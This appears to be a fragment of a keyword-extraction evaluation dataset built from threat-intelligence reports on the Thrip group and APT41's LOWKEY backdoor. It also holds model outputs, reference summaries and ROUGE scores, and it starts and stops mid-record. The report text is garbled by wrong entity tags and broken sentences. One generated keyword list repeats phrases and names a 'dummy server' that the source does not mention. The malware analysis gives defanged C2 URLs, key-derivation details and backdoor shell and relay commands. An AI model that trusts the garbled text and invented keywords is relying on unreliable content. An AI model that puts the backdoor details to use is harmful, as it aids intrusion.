[ORG] PDF with PDFmyURLIn addition to file - based protection , customers of the DeepSight Intelligence Managed Adversary and Threat Intelligence ( MATI ) service have received multiple reports on [ORG] Thrip ( codenamed ATG14 ) which detail methods of detecting and thwarting activities of this group . File Attachments\uf019Thrip [ORG] IOC listTXT [CARDINAL] 10.14 [ORG] KBFurther readingTo find out more about Targeted Attack Analytics ( TAA ) , read our whitepaper [WORK_OF_ART] Targeted [WORK_OF_ART] Attack [WORK_OF_ART] Analytics : [WORK_OF_ART] Using [WORK_OF_ART] Cloud - based [ORG] Artificial [ORG] Intelligence [ORG] for Enterprise - Focused [ORG] Advanced [ORG] Threat ProtectionAbout the Author Security Response Attack Investigation Team The Attack Investigation Team is a group of security experts within [ORG] Symantec [ORG] SecuritySave web pages as [ORG] PDF with PDFmyURLResponse whose mission is to investigate targeted attacks , drive enhanced protection in [NORP] Symantec products , and offer analysis which helps customers respond to attacks.\uf1e0Want to comment on this post?We encourage you to share your thoughts on your favorite social platform.\uf099 [PERSON] \uf08c \uf09a\uf14e [PERSON] Related [PERSON] Blog [PERSON] PostsPOSTED : MINREADPOSTED : MINREADPOSTED : MINREADPOSTED : MINSave web pages as [ORG] PDF with PDFmyURLREAD\uf0e0 SUBSCRIBEFOLLOW\uf099 \uf09a \uf08cContact Us Terms of Use Privacy & Cookies \u00a9 Save web pages as [ORG] PDF with PDFmyURL", "generated_text": "Targeted Attack Analytics; TAA; sensitive data; Southeast Asia; the attack; use; legitimate network administration tools; the tool; PsExec; Rikamanu; a new piece; infostealer. Catchamas; Chinese; Thrip; the communications; geospatial; defense; the malware; 2013; the response; the threat actor; insight; the research; the spear; malware; infrastructure; the analysis; the spear; the target; APT; a wide-ranging cyber espionage campaign; tactics; cyber espionage; tactics; the use; the land; data; detection; domains; threats.", "ref_text": "<START-1>The post discusses the cyberespionage group Thrip and their tactics, techniques, and procedures. Thrip has been active since 2013 and originates from China. Recently, Thrip has shifted tactics to \"living off the land\", meaning using built-in OS features and legitimate tools to conduct attacks and blend in. Symantec uncovered a new campaign by Thrip starting in January 2018 when their Targeted Attack Analytics technology detected suspicious lateral movement using PsExec on a telecom's network in Southeast Asia. Further investigation revealed new malware tools Catchamas and an updated Rikamanu being distributed. Thrip targeted several concerning sectors including satellite communications, geospatial imaging, telecoms, and defense contractors in the US and Southeast Asia. Their interest in operational systems suggests potential motives beyond spying like disrupting satellites. In addition to living off the land tools like PowerShell and Mimikatz, Thrip deploys custom malware against high-value targets including the remote access tools Rikamanu and Catchamas. Symantec has protections against Thrip's activities and new malware tools. The post highlights how targeted attackers are increasingly living off the land, making detection challenging and requiring advanced analytics. It also underscores supply chain concerns with a China-based group compromising satellite operations. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.5092838196286472, "gpt3/lexical/rouge_rouge2": 0.12799999999999997, "gpt3/lexical/rouge_rougeL": 0.24403183023872677, "gpt3/lexical/rouge_rougeLsum": 0.24403183023872677, "gpt3_generated_text": ["The article discusses the rise of \"living off the land\" tactics in cyber espionage, which involves the use of legitimate network administration tools and operating system features to compromise victims' networks. This tactic allows attackers to blend in and hide their activity among legitimate processes, making it harder to attribute attacks. The article highlights how Symantec's Targeted Attack Analytics (TAA) helps in investigating and detecting these attacks by leveraging advanced artificial intelligence and machine learning to spot patterns associated with targeted attacks. TAA recently led to the discovery of a cyber espionage campaign by the Thrip group, which was using the PsExec tool to move laterally within a telecoms operator's network and remotely install a new piece of malware. Further investigation revealed that Thrip had also targeted a satellite communications operator and an organization involved in geospatial imaging and mapping. The motive behind Thrip's attacks is likely espionage, but the group's interest in operational aspects suggests possible disruption as well. The article emphasizes the importance of tools like TAA in detecting and investigating these sophisticated attacks."]}, {"split_name": "val", "sample_id": "val_43", "prompt_text": "Extract the keywords: LOWKEY : Hunting for the Missing Volume Serial ID \ufb01reeye.com/blog/threat-research/2019/10/lowkey-hunting-for-the-missing-volume-serial-id.htmlIn [DATE] August [DATE] 2019 , [ORG] FireEye released the \u201c Double Dragon \u201d report on our newest graduated threat group : [GPE] APT41 . A [GPE] China - nexus dual espionage and \ufb01nancially - focused group , APT41 targets industries such as gaming , healthcare , high - tech , higher education , telecommunications , and travel services . This blog post is about the sophisticated passive backdoor we track as LOWKEY , mentioned in the APT41 report and recently unveiled at the [ORG] FireEye Cyber Defense Summit . We observed LOWKEY being used in highly targeted attacks , utilizing payloads that run only on speci\ufb01c systems . Additional malware family names are used in the blog post and brie\ufb02y described . For a complete overview of malware used by APT41 please refer to the Technical Annex section of our APT41 report . The blog post is split into [CARDINAL] three parts , which are shown in Figure [CARDINAL] 1 . The \ufb01rst describes how we managed to analyze the encrypted payloads . The [ORDINAL] second part features position independent loaders we observed in multiple samples , adding an additional layer of obfuscation . The \ufb01nal part is about the actual backdoor we call LOWKEY , which comes in [CARDINAL] two variants , a passive [ORG] TCP listener and a passive HTTP listener targeting [ORG] Internet [ORG] Information [ORG] Services ( IIS).Figure [CARDINAL] 1 : Blog post overview DEADEYE \u2013 RC5url\ufb01reeye.com/blog/threat-research/2019/10/lowkey-hunting-for-the-missing-volume-serial-id.html1/1710/16/2019LOWKEY : Hunting for the Missing Volume Serial ID | FireEye IncTracking APT41 activities over [DATE] the [DATE] past [DATE] months , we observed multiple samples that shared [CARDINAL] two unique features : the use of RC5 encryption which we do n\u2019t encounter often , and a unique string \u201c f@Ukd!rCto R$. \u201d . We track these samples as DEADEYE.DEADEYE comes in multiple variants : DEADEYE.DOWN has the capability to download additional payloads . [ORG] DEADEYE.APPEND has additional payloads appended to it . DEADEYE.EXT loads payloads that are already present on the system . DEADEYE.DOWN attempts to download [CARDINAL] two \ufb01les on the \ufb01rst execution of the malware . The \ufb01rst \ufb01le is downloaded from hxxp://checkin.travelsanignacio[.]com / static/20170730.jpg . The command and control ( C2 ) server response is \ufb01rst RC5 decrypted with the key \u201c wsprintfA \u201d and then RC5 encrypted with a different key and written to disk as < MODULE_NAME>.mui . The RC5 key is constructed using the volume serial number of the C drive . The volume serial number is a [QUANTITY] 4 - byte value , usually based on the install time of the system . The volume serial number is [ORG] XORed with the hard - coded constant \u201c f@Ukd!rCto R$. \u201d and then converted to hex to derive a key of [CARDINAL] up [CARDINAL] to [CARDINAL] 28 bytes in length . The key length can vary if the [ORG] XORed value contains an embedded [CARDINAL] zero byte because the lstrlenA API call is used to determine the length of it . Note that the lstrlenA API call happens before the result is converted to hex . If the index of the byte modulo [CARDINAL] 4 is [CARDINAL] zero , the hex conversion is in uppercase . The key derivation is illustrated in Table 1.Volume Serial number of C drive , for example 0xAABBCCDDF ^ 0xAA= 0xCCuppercase@ ^ 0xBB= 0xFBlowercaseU ^ 0xCC= 0x99lowercasek ^ 0xDD= 0xB6lowercased ^ 0xAA= 0xCEuppercase ! ^ 0xBB= 0x9Alowercaser ^ 0xCC= 0xBElowercaseC ^ 0xDD= 0x9Elowercaset ^ 0xAA= 0xDEuppercaseurl\ufb01reeye.com/blog/threat-research/2019/10/lowkey-hunting-for-the-missing-volume-serial-id.html2/1710/16/2019LOWKEY : Hunting for the Missing Volume Serial ID | FireEye Inco ^ 0xBB= 0xD4lowercase(0x20 ) ^ 0xCC= 0xEClowercaseR ^ 0xDD= 0x8Flowercase$ ^ 0xAA= 0x8Euppercase . ^ 0xBB= 0x95lowercaseDerived key CCfb99b6CE9abe9eDEd4ec8f8E95Table [CARDINAL] 1 : Key derivation exampleThe second \ufb01le is downloaded from hxxp://checkin.travelsanignacio[.]com / static/20160204.jpg . The C2 response is RC5 decrypted with the key \u201c wsprintfA \u201d and then [ORG] XORed with [GPE] 0x74 , before it to decrypt the \ufb01le using RC5 encryption . This effectively decrypts the \ufb01le the malware just downloaded and stored encrypted on the system previously . As the \ufb01le has been encrypted with a key based on the volume serial number it can only be executed on the system it was downloaded on or a system that has the same volume serial number , which would be a remarkable encrypted \ufb01le in a hex editor reveals a high entropy ( 7.999779/8 ) . RC5 uses Electronic Code Book ( ECB ) mode by default . [ORG] ECB means that each code block ( [CARDINAL] 64 bit ) is encrypted independent from other code blocks . This means the same plaintext block always results in the same cipher text , independent from its position in the binary . The \ufb01le has 792933 bytes in total but almost no duplicate cipher blocks , which means the data likely has an additional layer of encryption . Without the correct volume serial number nor any knowledge about the plaintext there is no knowledge of the current sample . [PERSON] DEADEYE.APPEND [PERSON] Fortunately searching for the unique string \u201c f@Ukd!rCto R$. \u201c in combination with artifacts from RC5 reveals additional samples . [CARDINAL] One of the related samples is [PERSON] DEADEYE.APPEND ( MD5 : ( url\ufb01le - supply - chain - attack/90380/ ) . This sample is different because it is protected with [ORG] VMProtect and has the obfuscated binary appended to it . The embedded binary starts at offset [DATE] 3287552 which can be seen in Figure [CARDINAL] 3 with the differing [PERSON] File [PERSON] Size and PE Size.url\ufb01reeye.com/blog/threat-research/2019/10/lowkey-hunting-for-the-missing-volume-serial-id.html4/1710/16/2019LOWKEY : Hunting for the Missing Volume Serial ID | [ORG] FireEye IncFigure 3 : A look at the [ORG] PE header reveals a larger \ufb01le size than [ORG] PE sizeThe encrypted payload has a slightly lower entropy of [CARDINAL] 7.990713 out of [CARDINAL] 8 . Looking at the embedded binary in a hex editor reveals multiple occurrences of the byte pattern [CARDINAL] 51 36 94 A4 [CARDINAL] 26 [CARDINAL] 5B [CARDINAL] 0F [CARDINAL] 19 , as seen in Figure [CARDINAL] 4 . As this pattern occurs multiple times in a row in the middle of the encrypted data and [ORG] ECB mode is being used , an educated guess is that the plaintext is supposed [FAC] RC5 [FAC] Brute Forcer With this knowledge we decided to take a reference implementation of RC5 and add a main function that accounts for the key derivation algorithm used by the malware samples ( see Figure [CARDINAL] 5 ) . [GPE] Brute forcing is possible as the key is derived from a single DWORD ; even though the \ufb01nal key length might be [CARDINAL] 28 bytes , there are [CARDINAL] only [CARDINAL] 4294967296 possible keys . The code shown in Figure [CARDINAL] 5 generates all possible volume serial numbers , derives the key from them and tries to decrypt [CARDINAL] 51 36 94 A4 [CARDINAL] 26 [CARDINAL] 5B [CARDINAL] 0F [CARDINAL] 19 [CARDINAL] to [CARDINAL] 00 [CARDINAL] 00 00 00 00 00 00 00 . Running the RC5 brute forcer for [TIME] a [TIME] couple [TIME] of [TIME] minutes shows the correct volume serial number for the sample , which is 0xc25cff4c . Note if you want to run the brute forcer yourself The number of DWORDs of the key in the reference implementation we used is represented by the global c , and we had to change it to [CARDINAL] 7 to match the malware \u2019s key length of [CARDINAL] 28 bytes . There were some issues with the conversion because in the malware a zero byte within the generated key ultimately leads to a shorter key length . The implementation we used uses a hard - coded key length ( c ) , so we generated multiple executables with c = [CARDINAL] 6 , c = [CARDINAL] 5 , c = [CARDINAL] 4 \u2026 as these usually only ran for [TIME] a [TIME] couple [TIME] of [TIME] minutes to cover the entire key space . All the samples mentioned in the Appendix 1 could be solved with c = [CARDINAL] 7 or c = [CARDINAL] 6.url\ufb01reeye.com/blog/threat-research/2019/10/lowkey-hunting-for-the-missing-volume-serial-id.html5/1710/16/2019LOWKEY : Hunting for the Missing Volume Serial ID | FireEye IncFigure 5 : [ORG] Main function RC5 brute forcerThe decrypted payload belongs to the malware family POISONPLUG ( MD5 : backdoor with plug - in capabilities . The malware is capable of registry or service persistence , self- removal , plug - in execution , and network connection forwarding . POISONPLUG has been observed using social platforms to host encoded command and control commands . We con\ufb01rmed the \ufb01ndings from [ORG] Kaspersky and additionally found a [ORDINAL] second command and control URL hxxps://steamcommunity[.]com / id / oswal053 , as mentioned in our APT 41 report.url\ufb01reeye.com/blog/threat-research/2019/10/lowkey-hunting-for-the-missing-volume-serial-id.html6/1710/16/2019LOWKEY : Hunting for the Missing Volume Serial ID | [ORG] FireEye IncTaking everything into account that we learned from [PRODUCT] DEADEYE.APPEND to match with the ones of the decrypted POISONPLUG payload did not yield any results . Fortunately , we found additional samples that use the same encryption scheme . In [CARDINAL] one of the samples the malware authors included [CARDINAL] two checks to validate the decrypted payload . The expected plaintext at the speci\ufb01ed offsets for [PERSON] DEADEYE.APPEND ( MD5 : which we could then manually check . The correct volume serial number for the encrypted mui is 0x243e2562 . Analysis determined the decrypted \ufb01le is [ORG] XMRig miner . This also explains why the dropper downloads [CARDINAL] two \ufb01les . The \ufb01rst , < MODULE_NAME>.mui is the crypto miner , and the [ORDINAL] second C:\\Windows\\System32\\wcnapi.mui , is the con\ufb01guration . The decrypted mui contains another layer of obfuscation and is eventually executed with the command x -c wcnapi.mui . An explanation on how the command was obtained and the additional layer of obfuscation is given in the next part of the blog post . For a list of samples with the corresponding volume serial numbers , please refer to Appendix 1 . Additional RC4 Layer An additional RC4 layer has been identi\ufb01ed in droppers used by APT41 , which we internally track as DEADEYE . The layer has been previously detailed in a blog post by ESET . We wanted to provide some additional information on this , as it was used in some of the samples we managed to brute force . The additional layer is position independent shellcode containing a re\ufb02ective [ORG] DLL loader . The loader decrypts an RC4 encrypted payload and loads it in memory . The code itself is a straight forward loader with the exception of some interesting artifacts identi\ufb01ed during analysis.url\ufb01reeye.com/blog/threat-research/2019/10/lowkey-hunting-for-the-missing-volume-serial-id.html7/1710/16/2019LOWKEY : Hunting for the Missing Volume Serial ID | [PERSON] FireEye [PERSON] IncAs mentioned in the blog post by ESET , the encrypted payload is prepended with a header . It contains the RC4 encryption key and [CARDINAL] two \ufb01elds of variable length , which have previously been identi\ufb01ed as \ufb01le names . These [CARDINAL] two \ufb01elds are encrypted with the same RC4 encryption key that is also used to decrypt the payload . The header is shown in [LAW] Table [LAW] 3.Header bytesMeaning0 \u2013 [DATE] 1516 \u2013 [CARDINAL] 1920 \u2013 2324 \u2013 2728 \u2013 3132 \u2013 [CARDINAL] 3536 \u2013 [CARDINAL] 3940 \u2013 ( [QUANTITY] 40 [QUANTITY] + CAS)RC4 key XOR encoded with 0x37Size of loader stub before the headerRC4 key sizeCommand ASCII size ( CAS)Command [ORG] UNICODE size ( CUS)Size of encrypted payloadLaunch typeCommand [ORG] ASCII(40 [ORG] + [ORG] CAS ) \u2013 ( [CARDINAL] 40 + CAS + CUS)Command UNICODE(40 + CAS + CUS ) \u2013 ( [CARDINAL] 40 + CAS + CUS + size of encrypted payload)Encrypted payloadTable [CARDINAL] 3 : RC4 header overviewLooking at the payloads hidden behind the RC5 layer , we observed , that these \ufb01elds are not limited to \ufb01le names , instead they can also contain commands used by the re\ufb02ective loader . If no command is speci\ufb01ed , the default parameter is the \ufb01le name of the loaded payload . In some instances , this revealed the full \ufb01le path and \ufb01le name in the development environment . Table [CARDINAL] 4 shows some paths and \ufb01le names . This is also how we found the command ( x -c wcnapi.mui ) used to launch the decrypted mui \ufb01le from the \ufb01rst part of the blog post . MD5 hashArguments found in the RC4 layer7f05d410dc0d1b0e7a3fcc6cd\u2010 da7a2ffE:\\code\\PortReuse\\3389 - share\\DeviceIOContrl - Hook\\v1.3 - 53\\Inner- Loader\\x64\\Release\\Inner - Loader.dll7f05d410dc0d1b0e7a3fcc6cd\u2010 da7a2ffE:\\code\\PortReuse\\3389 - share\\DeviceIOContrl - Hook\\v1.3- 53\\NetAgent\\x64\\Release\\NetAgent.exeurl\ufb01reeye.com / blog / threat - research/2019/10 / lowkey - hunting - for - the - missing - volume - serial - id.html8/1710/16/2019LOWKEY : Hunting for the Missing Volume Serial ID | [ORG] FireEye Inc7f05d410dc0d1b0e7a3fcc6cd\u2010 [ORG] da7a2ffE:\\code\\PortReuse\\3389 - share\\DeviceIOContrl - Hook\\v1.3- [CARDINAL] 53\\SK3.x\\x64\\Release\\SK3.x.exe7f05d410dc0d1b0e7a3fcc6cd\u2010 d805de683822bf4922aecb9bfef5E:\\code\\PortReuse\\iis - share\\2.5\\IIS_Share\\x64\\Release\\IIS_Share.dllc11d\u2010 d805de683822bf4922aecb9bfef5UserFunction.dllc11d\u2010 [DATE] d805de683822bf4922aecb9bfef5ProcTran.dllTable [DATE] 4 : [DATE] Decrypted paths and \ufb01le names LOWKEY The \ufb01nal part of the blog post describes the capabilities of the passive backdoor [GPE] LOWKEY ( MD5 : commands for a reverse shell , uploading and downloading \ufb01les , listing and killing processes and \ufb01le management . We have identi\ufb01ed [CARDINAL] two variants of the LOWKEY backdoor . The \ufb01rst is a TCP variant that listens on port [DATE] 53 , and the [ORDINAL] second is an HTTP variant that listens on [ORG] TCP port [CARDINAL] 80 . The HTTP variant intercepts URL requests matching the [ORG] UrlPre\ufb01x url The + in the given [ORG] UrlPre\ufb01x means that it will match any host name . It has been brie\ufb02y mentioned by [PERSON] Kaspersky as \u201c unknown backdoor\u201d . Both variants are loaded by the re\ufb02ective loader described in the previous part of the blog post . This means we were able to extract the original \ufb01le names . They contain meaningful names and E:\\code\\PortReuse\\3389 - share\\DeviceIOContrl - Hook\\v1.3 - 53\\SK3.x\\x64\\Release\\SK3.x.exeThe interesting parts are shown in Figure [CARDINAL] 6 . [ORG] PortReuse describes the general idea behind the backdoor , to operate on a well - known port . The paths also contain version numbers [CARDINAL] 2.5 and v1.3- 53 . IIS_Share is used for the HTTP variant and describes the targeted application , DeviceIOContrl - Hook is used for the TCP variant.url\ufb01reeye.com/blog/threat-research/2019/10/lowkey-hunting-for-the-missing-volume-serial-id.html9/1710/16/2019LOWKEY : Hunting for the Missing Volume Serial ID | [ORG] FireEye IncFigure 6 : Overview important parts of executable pathurl\ufb01reeye.com/blog/threat-research/2019/10/lowkey-hunting-for-the-missing-volume-serial-id.html10/1710/16/2019LOWKEY : Hunting for the Missing Volume Serial ID | [ORG] FireEye IncBoth LOWKEY variants are functionally identical with [CARDINAL] one exception . The [ORG] TCP variant relies on a [ORDINAL] second component , a user mode rootkit that is capable of intercepting incoming [ORG] TCP connections . The internal name used by the developers for that component is E:\\code\\PortReuse\\3389 - share\\DeviceIOContrl - Hook\\v1.3- 53\\NetAgent\\x64\\Release\\NetAgent.exe . Figure [CARDINAL] 7 : LOWKEY components Inner-Loader.dll Inner-Loader.dll is a watch guard for the LOWKEY backdoor . It leverages the GetExtendedTcpTable API to retrieve all processes with an open TCP connection . If a process is listening on [ORG] TCP port [CARDINAL] 53 it injects NetAgent.exe into the process . This is done in a loop with a [TIME] 10 [TIME] second delay . The loader exits the loop when NetAgent.exe has been successfully injected . After the injection it will create a new thread for the LOWKEY backdoor ( SK3.x.exe).The watch guard enters an endless loop that executes [TIME] every [TIME] 20 [TIME] minutes and ensures that the NetAgent.exe and the LOWKEY backdoor are still active . If this is not the case it will relaunch the backdoor or reinject the NetAgent.exe . NetAgent.exeNetAgent.exe is a user mode rootkit that provides covert communication with the LOWKEY backdoor component . It forwards incoming packets , after receiving the byte sequence [ORG] FF FF [DATE] 01 [DATE] 00 [DATE] 00 01 00 00 00 00 00 00 , to the named pipe [PERSON] \\\\.\\pipe\\Microsoft [PERSON] Ole [PERSON] Object { 30000 - 7100 - 12985- 00001 - 00001}.The component works by hooking the NtDeviceIoControlFile API . It does that by allocating a suspiciously large region of memory , which is used as a global hook table . The table consists of [CARDINAL] 0x668A0 bytes and has read , write and execute permissions set.url\ufb01reeye.com/blog/threat-research/2019/10/lowkey-hunting-for-the-missing-volume-serial-id.html11/1710/16/2019LOWKEY : Hunting for the Missing Volume Serial ID | [ORG] FireEye IncEach hook table entry consists of [CARDINAL] 3 pointers . The \ufb01rst points to memory containing the original [CARDINAL] 11 bytes of each hooked function , the [ORDINAL] second entry contains a pointer to the remaining original instructions and the [ORDINAL] third pointer points to the function hook . The malware will only hook [CARDINAL] one function in this manner and therefore allocates an unnecessary large amount of memory . The malware was designed to hook up to [CARDINAL] 10000 functions this way . The hook function begins by iterating the global hook table and compares the pointer to the hook function to itself . This is done to \ufb01nd the original instructions for the installed hook , in this case NtDeviceIoControlFile . The malware then executes the saved instructions which results in a regular NtDeviceIoControlFile API call . Afterwards the [GPE] IoControlCode is compared to [PERSON] 0x12017 ( [PERSON] AFD_RECV).If the [GPE] IoControlCode does not match , the original API call results are returned . If they match the malware compares the \ufb01rst [CARDINAL] 12 bytes of the incoming data . As it is effectively a [ORG] TCP packet , it is parsing the [ORG] TCP header to get the data of the packet . The \ufb01rst [CARDINAL] 12 bytes of the data section are compared against the hard - coded byte pattern : FF FF [DATE] 01 [DATE] 00 [DATE] 00 01 00 00 00 00 00 00.If they match it expects to receive additional data , which seems to be unused , and then responds with a [CARDINAL] 16 byte header 00 00 00 00 00 91 03 00 00 00 00 00 80 1F 00 00 , which seems to be hard - coded and to indicate that following packets will be forwarded to the named pipe [PERSON] \\\\.\\pipe\\Microsoft [PERSON] Ole [PERSON] Object { 30000 - 7100 - 12985 - 00001 - 00001 } . The backdoor component ( SK3.x.exe ) receives and sends data to the named pipe . The hook function will forward all received data from the named pipe back to the socket , effectively allowing a covert communication between the named pipe and the socket . SK3.x.exe SK3.x.exe is the actual backdoor component . It supports writing and reading \ufb01les , modi\ufb01cation of \ufb01le properties , an interactive command shell , [ORG] TCP relay functionality and listing running processes . The backdoor opens a named pipe [PERSON] \\\\.\\pipe\\Microsoft [PERSON] Ole [PERSON] Object { 30000 - 7100 - 12985- 00001 - 00001 } for communication . Data received by the backdoor is encrypted with RC4 using the key \u201c [ORG] CreateThread \u201c and then [ORG] XORed with 0x77 . All data sent by the backdoor uses the same encryption in reverse order ( \ufb01rst XOR with 0x77 , then RC4 encrypted with the key \u201c [ORG] CreateThread \u201c ) . Encrypted data is preceded by a [QUANTITY] 16 - byte header which is unencrypted containing an identi\ufb01er and the size of the following encrypted packet . An example header looks as follows : [CARDINAL] 00 00 00 00 00 [ORG] FD 00 00 10 00 00 00 00 00 00 00BytesMeaning00 00 00 00 00unknownurl\ufb01reeye.com/blog/threat-research/2019/10/lowkey-hunting-for-the-missing-volume-serial-id.html12/1710/16/2019LOWKEY : Hunting for the Missing Volume Serial ID | [ORG] FireEye IncFD [CARDINAL] 00Bytes [CARDINAL] 5 and [CARDINAL] 6 are the command identi\ufb01er , for a list of all supported identi\ufb01ers check [LAW] Table [LAW] 6 [LAW] and [ORG] Table 7.00unknown10 00 00 00Size of the encrypted packet that is send after the header00 00 00 00unknownTable [CARDINAL] 5 : Subcomponents of headerThe backdoor supports the commands listed in tables [LAW] Table [LAW] 6 [LAW] and [LAW] Table [LAW] 7 . Most commands expect a string at the beginning which likely describes the command and is for the convenience of the operators , but this string is n't actively used by the malware and could be anything . For example , [ORG] KILL < [ORG] PID > could also be A < PID > . Some of the commands rely on [CARDINAL] two payloads ( [ORG] UserFunction.dll and [ORG] ProcTran.dll ) , that are embedded in the backdoor and are either injected into another process or launch another process . UserFunction.dll [ORG] Userfunction.dll starts a hidden cmd.exe process , creates the named pipe [PERSON] \\\\.\\pipe\\Microsoft [PERSON] Ole [PERSON] Object { 30000 - 7100 - 12985 - 00000 - 00000 } and forwards all received data from the pipe to the standard input of the cmd.exe process . All output from the process is redirected back to the named pipe . This allows interaction with the shell over the named pipe . ProcTran.dll The component opens a [ORG] TCP connection to the provided host and port , creates the named pipe [PERSON] \\\\.\\pipe\\Microsoft [PERSON] Ole [PERSON] Object { 30000 - 7100 - 12985 - 00000 - 00001 } and forwards all received data from the pipe to the opened [ORG] TCP connection . All received packets on the connection are forwarded to the named pipe . This allows interaction with the [ORG] TCP connection over the named < arg2 > Provides a simple shell , that supports the following commands , dir , copy , move , del , sys\u2010 teminfo and cd . These match the functionality of standard commands from a shell . This is the only case where the < cmd > is actually [ORG] used.0xC9 < cmd > < arg1 > The argument is interpreted as a process i d ( [ORG] PID ) . The backdoor injects [PERSON] UserFunction.dll into the process , which is an interactive shell that forwards all input and output data to [ORG] Microsoft [ORG] Ole [ORG] Object { 30000 - 7100 - 12985 - 00000 - 00000 } . The backdoor will then forward incoming data to the named pipe allowing for communication with the opened shell . If no [ORG] PID is provided , the ` cmd.exe ` is launched as child process of the backdoor process with input and output redirected to the named pipe [ORG] Microsoft [ORG] Ole [ORG] Object { 30000 - 7100 - 12985- 00001 - 00001}url\ufb01reeye.com / blog / threat - research/2019/10 / lowkey - hunting - for - the - missing - volume - serial - id.html13/1710/16/2019LOWKEY : Hunting for the Missing Volume Serial ID | [ORG] FireEye Inc0xCA0xCB < cmd > < arg3 > Writes data to a \ufb01le . The \ufb01rst argument is the < \ufb01le_name > , the [ORDINAL] second argument is an offset into the [NORP] \ufb01leReads data from a \ufb01le . The \ufb01rst argument is the < \ufb01le_name > , the [ORDINAL] second argument is an offset into the \ufb01le , the [ORDINAL] third argument is optional , and the exact purpose is unknown0xFA - Lists running processes , including the process name , [ORG] PID , process owner and the exe\u2010 cutable path0xFB < cmd > < arg1>0xFC < cmd > < arg1 > < arg2>0xFD -0xFE - Kills the process with the provided process i d ( PID)Copies the \ufb01les [PRODUCT] CreationTime , [PERSON] LastAccessTime and LastWriteTime from the [ORDINAL] second ar\u2010 gument and applies them to the \ufb01rst argument . Both arguments are expected to be full \ufb01le paths . The order of the arguments is a bit unusual , as one would usually apply the ac\u2010 cess times from the [ORDINAL] second argument to the thirdList running processes with additional details like the [ORG] SessonId and the [PRODUCT] CommandLine by executing the [ORG] WMI query [PERSON] SELECT [PERSON] Name , [GPE] ProcessId , [ORG] SessionId , [PRODUCT] CommandLine , Exe\u2010 cutablePath FROM Win32_ProcessPing command , the malware responds with the following byte sequence 00 00 00 00 00 65 00 00 00 00 00 00 06 00 00 00 . Experiments with the backdoor revealed that the iden\u2010 ti\ufb01er 0x65 seems to indicate a successful operation , whereas 0x66 indicates an error . Table 6 : [CARDINAL] C2 commandsThe commands listed in [LAW] Table [LAW] 7 are used to provide functionality of a [ORG] TCP traf\ufb01c relay . This allows operators to communicate through the backdoor with another host via [ORG] TCP . This could be used for lateral movement in a network . For example , [CARDINAL] one instance of the backdoor could be used as a jump host and additional hosts in the target network could be reached via the [ORG] TCP traf\ufb01c relay . Note that the commands [DATE] 0xD2 , [DATE] 0xD3 and [CARDINAL] 0xD6 listed in [LAW] Table [LAW] 7 can be used in the main backdoor thread , without having to use the [ORG] ProcTran.dll . Iden\u2010 < arg1 > The argument is interpreted as a process i d ( [ORG] PID ) . The backdoor injects [ORG] ProcTran.dll into the process , which is a [ORG] TCP traf\ufb01c relay component that forwards all input and output data to [ORG] Microsoft [ORG] Ole [ORG] Object { 30000 - 7100 - 12985 - 00000 - 00001 } . The commands [DATE] 0xD2 , [DATE] 0xD3 and 0xD6 can then be used with the component.0xD2 < arg1 > < arg2 > Opens a connection to the provided host and port , the \ufb01rst argument is the host , the sec\u2010 ond the port . On success a header with the identi\ufb01er set to [PERSON] 0xD4 is returned ( 00 00 00 00 00 D4 00 00 00 00 00 00 00 00 00 00 ) . This effectively establishes a [ORG] TCP traf\ufb01c relay allowing operators to communicate with another system through the backdoored machine.url\ufb01reeye.com/blog/threat-research/2019/10/lowkey-hunting-for-the-missing-volume-serial-id.html14/1710/16/2019LOWKEY : Hunting for the Missing Volume Serial ID | FireEye Inc0xD3 < arg1 > Receives and sends data over the connection opened by the 0xD2 command . Received data is \ufb01rst RC4 decrypted with the key \u201c [ORG] CreateThread \u201c and then single - byte XOR de\u2010 coded with [CARDINAL] 0x77 . Data sent back is directly relayed without any additional encryption.0xD60xCF -- Closes the socket connection that had been established by the [CARDINAL] 0xD2 commandCloses the named pipe [ORG] Microsoft [ORG] Ole [ORG] Object { 30000 - 7100 - 12985 - 00000 - 00001 } that is used to communicate with the injected [ORG] ProcTran.dll . This seems to terminate the thread in the targeted process by the 0x105 commandTable [CARDINAL] 7 : [CARDINAL] C2 commands [ORG] TCP relay Summary The TCP LOWKEY variant passively listens for the byte sequence [ORG] FF FF [DATE] 01 [DATE] 00 [DATE] 00 01 00 00 00 00 00 00 on [ORG] TCP port [CARDINAL] 53 to be activated . The backdoor then uses up to [CARDINAL] three named pipes for communication . [CARDINAL] One pipe is used for the main communication of the backdoor , the other ones are used on demand for the embedded payloads.\\\\.\\pipe\\Microsoft Ole Object { 30000 - 7100 - 12985 - 00001 - 00001 } main communication pipe [ORG] \\\\.\\pipe\\Microsoft [ORG] Ole [ORG] Object { 30000 - 7100 - 12985 - 00000 - 00001 } named pipe used for interaction with the [ORG] TCP relay module [ORG] ProcTran.dll [ORG] \\\\.\\pipe\\Microsoft [ORG] Ole [ORG] Object { 30000 - 7100 - 12985 - 00000 - 00000 } named pipe used for the interactive shell module UserFunction.dllFigure 8 summarizes how the LOWKEY components interact with each other.url\ufb01reeye.com/blog/threat-research/2019/10/lowkey-hunting-for-the-missing-volume-serial-id.html15/1710/16/2019LOWKEY : Hunting for the Missing Volume Serial ID | FireEye IncFigure 8 : LOWKEY passive backdoor overview AppendixMD5 HASHCorrect Volume FamilyPOISONPLUGPOISONPLUGLOWKEY.HTTPPOISONPLUGPOISONPLUGurl\ufb01reeye.com/blog/threat-research/2019/10/lowkey-hunting-for-the-missing-volume-serial-id.html16/1710/16/2019LOWKEY : Hunting for the Missing Volume Serial ID | [ORG] FireEye Inc - DEADEYE.DOWN - DEADEYE.AP\u2010 [ORG] PENDLOWKEYPOISONPLUGPOISONPLUGPOISONPLUGAppendix 1 : List of samples with RC5 encrypted payloadsurl\ufb01reeye.com/blog/threat-research/2019/10/lowkey-hunting-for-the-missing-volume-serial-id.html17/17", "generated_text": "APT41; China; the malware; RC5 encryption; a unique string; f@Ukd!rCto R$; DEADEYE.DOWN; additional payloads; DEADEYE.APPEND; a passive HTTP listener; Internet Information Services; The RC5 key; the C drive; the volume serial number; the C2 server; the C2 server; the installed time; a payload; a command; control; a dummy server; the dummy server; the C2 server; a remote server; The remote server; the C2 server; a remote server; the system; the payload; the remote server; the remote server; the C2 server; a control; the C2 server; the dummy server; information; the server; the C2 server; the server; the C2 server; payloads; different payloads; the payloads; the C2 server; the DLL; the RC5 key; the DLL; a variant; DEADEYE.DOWN; DEADEYE.EXT; DEADEYE.DOWN; payloads", "ref_text": "<START-1>The PDF describes analysis of malware used by the 